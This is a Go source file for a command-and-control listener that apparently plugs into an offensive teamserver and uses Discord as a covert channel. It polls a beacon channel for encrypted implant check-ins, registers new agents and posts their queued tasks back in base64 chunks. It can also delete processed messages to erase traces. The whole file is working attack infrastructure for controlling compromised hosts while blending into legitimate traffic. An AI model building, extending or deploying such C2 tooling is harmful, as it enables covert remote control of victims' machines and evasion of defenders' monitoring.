package main

import (
	"crypto/aes"
	"crypto/cipher"
	"encoding/base64"
	"encoding/binary"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"net/http"
	"strings"
	"sync"
	"time"
)

type Listener struct {
	transport *TransportDiscord
}

type ConfigDiscord struct {
	BotToken      string `json:"bot_token"`
	ChannelBeacon string `json:"channel_beacon"`
	ChannelTasks  string `json:"channel_tasks"`
	WebhookUrl    string `json:"webhook_url"`
	PollInterval  int    `json:"poll_interval"`
	Cleanup       bool   `json:"cleanup"`
	EncryptKey    string `json:"encrypt_key"`

	// Derived (not serialized to JSON)
	encryptKeyBytes []byte `json:"-"`
}

type TransportDiscord struct {
	Name     string
	Config   ConfigDiscord
	Active   bool
	stopChan chan struct{}
	client   *http.Client
	mu       sync.Mutex
}

// Discord API message structure
type DiscordMessage struct {
	Id      string `json:"id"`
	Content string `json:"content"`
}

// Discord API send message body
type DiscordSendBody struct {
	Content string `json:"content"`
}

const (
	discordAPIBase = "https://discord.com/api/v10"
	// Discord rate limit: 5 requests / 2 seconds per channel
	apiDelay = 500 * time.Millisecond
	// Max message content size (Discord limit is 2000 chars, base64 overhead ~33%)
	maxMessageSize = 1900
)

func (t *TransportDiscord) Start(ts Teamserver) error {
	t.mu.Lock()
	defer t.mu.Unlock()

	if t.Active {
		return errors.New("transport already active")
	}

	// Decode encrypt key
	var err error
	if len(t.Config.encryptKeyBytes) == 0 {
		return errors.New("encrypt key not initialized")
	}

	t.client = &http.Client{
		Timeout: 30 * time.Second,
	}

	t.stopChan = make(chan struct{})
	t.Active = true

	fmt.Printf("   Started listener '%s': discord (beacon=%s, tasks=%s, poll=%ds)\n",
		t.Name, t.Config.ChannelBeacon, t.Config.ChannelTasks, t.Config.PollInterval)

	go t.pollLoop(ts)

	_ = err
	return nil
}

func (t *TransportDiscord) Stop() error {
	t.mu.Lock()
	defer t.mu.Unlock()

	if !t.Active {
		return nil
	}

	close(t.stopChan)
	t.Active = false
	fmt.Printf("   Stopped listener '%s': discord\n", t.Name)
	return nil
}

func (t *TransportDiscord) pollLoop(ts Teamserver) {
	ticker := time.NewTicker(time.Duration(t.Config.PollInterval) * time.Second)
	defer ticker.Stop()

	for {
		select {
		case <-t.stopChan:
			return
		case <-ticker.C:
			t.pollMessages(ts)
		}
	}
}

func (t *TransportDiscord) pollMessages(ts Teamserver) {
	messages, err := t.getMessages(t.Config.ChannelBeacon)
	if err != nil {
		fmt.Printf("[discord:%s] Error polling beacon channel: %v\n", t.Name, err)
		return
	}

	for _, msg := range messages {
		content := strings.TrimSpace(msg.Content)
		if content == "" {
			continue
		}

		t.processMessage(ts, msg)

		// Rate limit delay between processing messages
		time.Sleep(apiDelay)
	}
}

func (t *TransportDiscord) processMessage(ts Teamserver, msg DiscordMessage) {
	content := strings.TrimSpace(msg.Content)

	// The beacon sends messages as: base64(beat_data) + "|" + base64(body_data)
	// Using | separator instead of \n (newline breaks JSON content)
	parts := strings.SplitN(content, "|", 2)
	if len(parts) == 0 {
		return
	}

	beatB64 := strings.TrimSpace(parts[0])
	var bodyB64 string
	if len(parts) > 1 {
		bodyB64 = strings.TrimSpace(parts[1])
	}

	// Decode beat
	beatCrypt, err := base64.StdEncoding.DecodeString(beatB64)
	if err != nil || len(beatCrypt) < 5 {
		fmt.Printf("[discord:%s] Failed to decode beat from message %s: %v\n", t.Name, msg.Id, err)
		goto CLEANUP
	}

	{
		agentType, agentId, beat, err := t.decryptBeat(beatCrypt)
		if err != nil {
			fmt.Printf("[discord:%s] Failed to decrypt beat from message %s: %v\n", t.Name, msg.Id, err)
			goto CLEANUP
		}

		// Decode body data if present
		var bodyData []byte
		if bodyB64 != "" {
			bodyData, err = base64.StdEncoding.DecodeString(bodyB64)
			if err != nil {
				fmt.Printf("[discord:%s] Failed to decode body from message %s: %v\n", t.Name, msg.Id, err)
				goto CLEANUP
			}
		}

		// Create agent if new
		if !Ts.TsAgentIsExists(agentId) {
			_, err = Ts.TsAgentCreate(agentType, agentId, beat, t.Name, "discord", true)
			if err != nil {
				fmt.Printf("[discord:%s] Failed to create agent %s: %v\n", t.Name, agentId, err)
				goto CLEANUP
			}
		}

		// Update tick
		_ = Ts.TsAgentSetTick(agentId, t.Name)

		// Process body data
		if len(bodyData) > 0 {
			_ = Ts.TsAgentProcessData(agentId, bodyData)
		}

		// Get pending tasks for this agent
		responseData, err := Ts.TsAgentGetHostedAll(agentId, 0x1900000) // 25 MB
		if err != nil {
			fmt.Printf("[discord:%s] Failed to get tasks for agent %s: %v\n", t.Name, agentId, err)
			goto CLEANUP
		}

		// Send tasks back via tasks channel
		if len(responseData) > 0 {
			encoded := base64.StdEncoding.EncodeToString(responseData)

			// Discord messages have a 2000 char limit, split if needed
			err = t.sendChunkedMessage(t.Config.ChannelTasks, encoded)
			if err != nil {
				fmt.Printf("[discord:%s] Failed to send tasks to agent %s: %v\n", t.Name, agentId, err)
			}
		}
	}

CLEANUP:
	// Delete the processed message if cleanup is enabled
	if t.Config.Cleanup {
		time.Sleep(apiDelay)
		err := t.deleteMessage(t.Config.ChannelBeacon, msg.Id)
		if err != nil {
			fmt.Printf("[discord:%s] Failed to delete message %s: %v\n", t.Name, msg.Id, err)
		}
	}
}

func (t *TransportDiscord) decryptBeat(ciphertext []byte) (string, string, []byte, error) {
	block, err := aes.NewCipher(t.Config.encryptKeyBytes)
	if err != nil {
		return "", "", nil, errors.New("aes cipher error")
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return "", "", nil, errors.New("gcm error")
	}

	nonceSize := gcm.NonceSize()
	if len(ciphertext) < nonceSize+gcm.Overhead() {
		return "", "", nil, errors.New("beat ciphertext too short")
	}

	nonce, ct := ciphertext[:nonceSize], ciphertext[nonceSize:]
	plaintext, err := gcm.Open(nil, nonce, ct, nil)
	if err != nil {
		return "", "", nil, errors.New("aes-gcm decrypt error")
	}

	if len(plaintext) < 8 {
		return "", "", nil, errors.New("beat plaintext too short")
	}

	agentType := uint(binary.BigEndian.Uint32(plaintext[:4]))
	agentId := uint(binary.BigEndian.Uint32(plaintext[4:8]))
	beat := plaintext[8:]

	return fmt.Sprintf("%08x", agentType), fmt.Sprintf("%08x", agentId), beat, nil
}

// getMessages retrieves messages from a Discord channel using the Bot API
func (t *TransportDiscord) getMessages(channelId string) ([]DiscordMessage, error) {
	url := fmt.Sprintf("%s/channels/%s/messages?limit=50", discordAPIBase, channelId)

	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		return nil, err
	}

	req.Header.Set("Authorization", "Bot "+t.Config.BotToken)
	req.Header.Set("Content-Type", "application/json")

	resp, err := t.client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	if resp.StatusCode == 429 {
		// Rate limited, back off
		return nil, errors.New("discord rate limited")
	}

	if resp.StatusCode != 200 {
		body, _ := io.ReadAll(resp.Body)
		return nil, fmt.Errorf("discord API error %d: %s", resp.StatusCode, string(body))
	}

	var messages []DiscordMessage
	err = json.NewDecoder(resp.Body).Decode(&messages)
	if err != nil {
		return nil, err
	}

	return messages, nil
}

// sendMessage posts a message to a Discord channel using the Bot API
func (t *TransportDiscord) sendMessage(channelId string, content string) error {
	url := fmt.Sprintf("%s/channels/%s/messages", discordAPIBase, channelId)

	body := DiscordSendBody{Content: content}
	jsonBody, err := json.Marshal(body)
	if err != nil {
		return err
	}

	req, err := http.NewRequest("POST", url, strings.NewReader(string(jsonBody)))
	if err != nil {
		return err
	}

	req.Header.Set("Authorization", "Bot "+t.Config.BotToken)
	req.Header.Set("Content-Type", "application/json")

	resp, err := t.client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode == 429 {
		return errors.New("discord rate limited")
	}

	if resp.StatusCode != 200 && resp.StatusCode != 201 {
		respBody, _ := io.ReadAll(resp.Body)
		return fmt.Errorf("discord API error %d: %s", resp.StatusCode, string(respBody))
	}

	return nil
}

// sendChunkedMessage splits a large message into Discord-compatible chunks
// Each chunk is raw base64 (no prefix) — the beacon concatenates all chunks
// in order (oldest first) and base64-decodes the result.
// Chunks are split at 4-byte boundaries to keep valid base64.
func (t *TransportDiscord) sendChunkedMessage(channelId string, content string) error {
	if len(content) <= maxMessageSize {
		return t.sendMessage(channelId, content)
	}

	// Split at base64-safe boundary (multiple of 4)
	chunkSize := (maxMessageSize / 4) * 4 // round down to 4-byte boundary

	for len(content) > 0 {
		end := chunkSize
		if end > len(content) {
			end = len(content)
		}

		chunk := content[:end]
		content = content[end:]

		err := t.sendMessage(channelId, chunk)
		if err != nil {
			return fmt.Errorf("failed to send chunk: %v", err)
		}

		time.Sleep(apiDelay)
	}

	return nil
}

// deleteMessage removes a message from a Discord channel
func (t *TransportDiscord) deleteMessage(channelId string, messageId string) error {
	url := fmt.Sprintf("%s/channels/%s/messages/%s", discordAPIBase, channelId, messageId)

	req, err := http.NewRequest("DELETE", url, nil)
	if err != nil {
		return err
	}

	req.Header.Set("Authorization", "Bot "+t.Config.BotToken)

	resp, err := t.client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode == 429 {
		return errors.New("discord rate limited")
	}

	// 204 No Content is the expected success response for DELETE
	if resp.StatusCode != 204 && resp.StatusCode != 200 {
		respBody, _ := io.ReadAll(resp.Body)
		return fmt.Errorf("discord API error %d: %s", resp.StatusCode, string(respBody))
	}

	return nil
}
